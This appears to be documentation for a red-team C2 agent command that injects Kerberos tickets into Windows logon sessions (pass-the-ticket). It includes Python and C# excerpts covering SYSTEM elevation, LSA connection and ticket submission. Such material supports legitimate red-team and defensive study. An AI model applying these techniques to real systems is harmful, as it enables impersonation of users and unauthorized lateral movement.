+++
title = "ticket_cache_add"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: WindowsAPIInvoke
{{% /notice %}}

## Summary
Adds Kerberos tickets to the current logon session's ticket cache using LSA APIs. Supports loading tickets from base64-encoded data or existing Mythic credential store entries. Can target specific logon sessions when executed from elevated context.

- **Needs Admin:** False (elevated context required for targeting specific LUIDs)
- **Version:** 2
- **Author:** @drago-qcc

### Arguments
- **base64ticket** (String, Required for "Add New Ticket" group) - Base64-encoded Kerberos ticket
- **existingTicket** (Credential_JSON, Required for "Use Existing Ticket" group) - Existing ticket from Mythic credential store
- **luid** (String, Optional) - Target LUID for ticket loading (requires elevation)

## Usage
```
ticket_cache_add {"base64ticket": "doIFXjCCBVqgAwIBBaEDAgEWooIEg..."}
ticket_cache_add {"existingTicket": {...}, "luid": "0x12345678"}
```

**Output:**
```
client: user@DOMAIN.COM, service: krbtgt/DOMAIN.COM@DOMAIN.COM
```

## Detailed Summary

### Agent Execution Flow

#### 1. Parameter Processing and Validation
```python
async def parse_arguments(self):
    if self.command_line[0] != "{":
        raise Exception("Require JSON blob, but got raw command line.")
    self.load_args_from_json_string(self.command_line)
```
- Requires JSON parameter format only
- Supports two parameter groups: "Add New Ticket" and "Use Existing Ticket"
- Validates JSON structure before processing

#### 2. Ticket Source Resolution (Python)
```python
current_group_name = taskData.args.get_parameter_group_name()
if current_group_name == "Use Existing Ticket":
    credentialData = taskData.args.get_arg("existingTicket")
    taskData.args.remove_arg("existingTicket")
    taskData.args.add_arg("base64ticket", credentialData["credential"], 
                         parameter_group_info=[ParameterGroupInfo(group_name=current_group_name)])
```
- Handles existing ticket selection from credential store
- Extracts credential data and converts to base64ticket parameter
- Maintains parameter group information for processing

#### 3. Ticket Parsing and Credential Creation
```python
base64Ticket = taskData.args.get_arg("base64ticket")
ccache = CCache()
ccache.fromKRBCRED(base64.b64decode(base64Ticket))

formattedComment = f"Service: {ccache.credentials[0].__getitem__('server').prettyPrint().decode('utf-8')}\n"
formattedComment += f"Start: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['starttime']).isoformat()}\n"
formattedComment += f"End: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['endtime']).isoformat()}\n"
formattedComment += f"Renew: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['renew_till']).isoformat()}\n"

if current_group_name == "Add New Ticket":
    resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
        TaskID=taskData.Task.ID,
        Credentials=[
            MythicRPCCredentialData(
                credential_type="ticket",
                credential=taskData.args.get_arg("base64ticket"),
                account=ccache.credentials[0].__getitem__("client").prettyPrint().decode('utf-8'),
                realm=ccache.credentials[0].__getitem__("client").prettyPrint().decode('utf-8').split("@")[1],
                comment=formattedComment,
            )
        ]
    ))
```
- Uses Impacket CCache to parse Kerberos ticket structure
- Extracts client, server, and timing information
- Creates credential entry in Mythic for new tickets
- Formats detailed comment with ticket metadata

#### 4. LSA Connection and Package Resolution (C#)
```csharp
// From KerberosHelpers.cs
private static HANDLE GetLsaHandleUntrusted(bool elevateToSystem = true)
{
    HANDLE lsaHandle = new();
    if(Agent.GetIdentityManager().GetIntegrityLevel() is IntegrityLevel.HighIntegrity && elevateToSystem)
    {
        (elevated, _systemHandle) = Agent.GetIdentityManager().GetSystem();
        createdArtifacts.Add(Artifact.PrivilegeEscalation("SYSTEM"));
        
        if (elevated)
        {
            var originalUser = WindowsIdentity.Impersonate(_systemHandle);
            WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
            originalUser.Undo();
            createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaConnectUntrusted"));
        }
    }
    else
    {
        WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
        createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaConnectUntrusted"));
    }
    return lsaHandle;
}

private static uint GetAuthPackage(HANDLE lsaHandle, HANDLE<LSA_IN_STRING> packageNameHandle)
{
    NTSTATUS lsaLookupStatus = WindowsAPI.LsaLookupAuthenticationPackageDelegate(lsaHandle, packageNameHandle, out uint authPackage);
    createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaLookupAuthenticationPackage"));
    if (lsaLookupStatus != NTSTATUS.STATUS_SUCCESS)
    {
        DebugHelp.DebugWriteLine($"Failed package lookup with error: {lsaLookupStatus}");
        return 0;
    }
    return authPackage;
}
```
- Establishes LSA connection using `LsaConnectUntrusted`
- Elevates to SYSTEM for high integrity contexts
- Looks up Kerberos authentication package
- Generates appropriate artifacts for API calls

#### 5. Ticket Loading Process
```csharp
// From KerberosHelpers.cs - LoadTicket method
internal static (bool, string) LoadTicket(byte[] submittedTicket, LUID targetLuid)
{
    var requestSize = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>();

    KERB_SUBMIT_TKT_REQUEST request = new()
    {
        MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage,
        LogonId = targetLuid,
        KerbCredSize = submittedTicket.Length,
        KerbCredOffset = requestSize,
    };

    var ticketSize = submittedTicket.Length;
    var requestPlusTicketSize = requestSize + ticketSize;
    requestAndTicketHandle = new(Marshal.AllocHGlobal(requestPlusTicketSize));

    Marshal.StructureToPtr(request, requestAndTicketHandle, false);
    HANDLE requestEndAddress = new(new(requestAndTicketHandle.PtrLocation.ToInt64() + requestSize));
    Marshal.Copy(submittedTicket, 0, requestEndAddress.PtrLocation, ticketSize);

    var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestAndTicketHandle, requestPlusTicketSize, out returnBuffer, out uint returnLength, out NTSTATUS returnStatus);
    createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaCallAuthenticationPackage"));

    if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
    {
        return (false, $"Failed to submit ticket.\nLsaCallAuthentication returned {status} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(status)}) with protocolStatus {returnStatus} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(returnStatus)})");
    }
    return (true, "");
}
```
- Creates `KERB_SUBMIT_TKT_REQUEST` structure
- Allocates memory for request and ticket data
- Uses `LsaCallAuthenticationPackage` to submit ticket
- Handles memory management and cleanup

#### 6. LUID Handling and Target Selection
```csharp
// From ticket loading logic
if(Agent.GetIdentityManager().GetIntegrityLevel() <= IntegrityLevel.MediumIntegrity)
{
    targetLuid = new LUID();
}
```
- Uses current logon session LUID for non-elevated contexts
- Allows targeting specific LUID when elevated
- Validates integrity level before LUID targeting

#### 7. Memory Management and Cleanup
```csharp
// From LoadTicket method
finally
{
    Marshal.FreeHGlobal(requestAndTicketHandle.PtrLocation);
    WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
    WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
    createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaDeregisterLogonProcess"));
}
```
- Frees allocated memory for request structure
- Releases LSA return buffers
- Deregisters LSA logon process
- Ensures proper cleanup regardless of success/failure

### Kerberos Ticket Structure

#### KERB_SUBMIT_TKT_REQUEST Structure
```csharp
KERB_SUBMIT_TKT_REQUEST request = new()
{
    MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage,
    LogonId = targetLuid,
    KerbCredSize = submittedTicket.Length,
    KerbCredOffset = requestSize,
};
```
- **MessageType**: Specifies ticket submission operation
- **LogonId**: Target logon session identifier
- **KerbCredSize**: Size of ticket data in bytes
- **KerbCredOffset**: Offset to ticket data within request

#### Ticket Metadata Extraction
```python
# Ticket information extracted by Impacket
client = ccache.credentials[0].__getitem__('client').prettyPrint().decode('utf-8')
server = ccache.credentials[0].__getitem__('server').prettyPrint().decode('utf-8')
starttime = datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['starttime']).isoformat()
endtime = datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['endtime']).isoformat()
renew_till = datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['renew_till']).isoformat()
```

### Error Handling

#### LSA Operation Errors
```csharp
if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
{
    return (false, $"Failed to submit ticket.\nLsaCallAuthentication returned {status} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(status)}) with protocolStatus {returnStatus} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(returnStatus)})");
}
```
- Checks both API status and protocol status
- Converts NTSTATUS codes to Win32 error codes
- Provides detailed error information

#### Connection Initialization Errors
```csharp
(HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> _, string error) = InitKerberosConnectionAndSessionInfo(false);
if(error != "")
{
    return (false, $"Failed to Initialize Kerberos Connection and Session Info\n{error}");
}
```
- Validates LSA connection establishment
- Handles authentication package lookup failures
- Provides specific error context

### Integration Points

#### TicketManager Integration
```csharp
// From KerberosTicketManager.cs
public (bool, string) LoadTicketIntoCache(byte[] ticket, string luid) => 
    KerberosHelpers.LoadTicket(ticket, WinNTTypes.LUID.FromString(luid));
```
- Provides interface to KerberosHelpers functionality
- Handles LUID string conversion
- Maintains consistent API surface

#### Mythic Credential Store Integration
```python
await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
    TaskID=taskData.Task.ID,
    Credentials=[MythicRPCCredentialData(
        credential_type="ticket",
        credential=taskData.args.get_arg("base64ticket"),
        account=client_name,
        realm=realm_name,
        comment=formatted_comment,
    )]
))
```
- Creates credential entries for loaded tickets
- Stores ticket metadata for future reference
- Enables ticket reuse across operations

### Display Parameters

#### Parameter Display Format
```python
response.DisplayParams = f" client: {ccache.credentials[0].__getitem__('client').prettyPrint().decode('utf-8')}"
response.DisplayParams += f", service: {ccache.credentials[0].__getitem__('server').prettyPrint().decode('utf-8')}"
luid = taskData.args.get_arg("luid")
if luid is not None and luid != "":
    response.DisplayParams += f" -luid {luid}"
```
- Shows client and service principals
- Includes target LUID when specified
- Provides clear operation summary

## APIs Used
| API | Purpose | DLL |
|-----|---------|-----|
| `LsaConnectUntrusted` | Connect to LSA | advapi32.dll |
| `LsaLookupAuthenticationPackage` | Get Kerberos auth package | advapi32.dll |
| `LsaCallAuthenticationPackage` | Submit ticket to LSA | advapi32.dll |
| `LsaFreeReturnBuffer` | Free LSA memory | advapi32.dll |
| `LsaDeregisterLogonProcess` | Close LSA connection | advapi32.dll |
| `LsaNtStatusToWinError` | Convert NTSTATUS to Win32 | advapi32.dll |
| `GetSystem` | Elevate to SYSTEM | Apollo IdentityManager |

## MITRE ATT&CK Mapping
- **T1550** - Use Alternate Authentication Material
- **T1550.003** - Use Alternate Authentication Material: Pass the Ticket

## Security Considerations
- **Ticket Injection**: Loads arbitrary Kerberos tickets into system cache
- **LSA Interaction**: Direct interaction with Local Security Authority
- **Privilege Requirements**: Elevated context needed for cross-session operations
- **Credential Storage**: Tickets stored in Mythic credential database
- **Session Targeting**: Can target specific logon sessions when elevated

## Limitations
1. **JSON Format Only**: Requires JSON parameter format
2. **Elevation for LUID**: Targeting specific LUIDs requires elevated context
3. **Valid Tickets**: Only accepts properly formatted Kerberos tickets
4. **Memory Constraints**: Large tickets may cause memory allocation issues
5. **LSA Dependencies**: Requires functional LSA subsystem
6. **Session Access**: Limited to accessible logon sessions

## Error Conditions
- **Invalid JSON**: Malformed JSON parameters
- **LSA Connection Failed**: Cannot connect to Local Security Authority
- **Package Lookup Failed**: Kerberos authentication package not found
- **Ticket Submit Failed**: LSA rejected ticket submission
- **Memory Allocation Failed**: Insufficient memory for ticket operations
- **Invalid Ticket Format**: Malformed or corrupted ticket data
- **Access Denied**: Insufficient privileges for target LUID

## Best Practices
1. **Ticket Validation**: Verify ticket format before loading
2. **Error Monitoring**: Check for LSA operation failures
3. **Memory Management**: Monitor memory usage for large tickets
4. **Credential Tracking**: Use Mythic credential store for ticket management
5. **LUID Awareness**: Understand target session implications
6. **Privilege Context**: Ensure appropriate elevation for cross-session operations